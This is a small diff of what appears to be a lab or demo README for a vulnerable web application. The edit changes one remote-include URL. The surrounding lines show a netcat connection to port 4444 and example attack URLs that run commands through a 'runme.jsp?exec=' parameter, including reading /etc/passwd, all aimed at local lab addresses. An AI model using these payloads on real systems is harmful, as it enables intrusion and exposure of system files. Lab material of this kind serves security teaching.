@@ -41,7 +41,7 @@ nc 172.18.0.1 4444
 
 - http://127.0.0.1:8881/webapp/?help=runme.jsp?exec=ls
 - http://127.0.0.1:8881/webapp/?help=runme.jsp?exec=cat%20/etc/passwd
-- http://127.0.0.1:8881/webapp/?help=http://172.18.0.3:8080/jsp/introduction
+- http://127.0.0.1:8881/webapp/?help=http://172.18.0.3:8080/webapp/introduction
 
 # Further Information
 
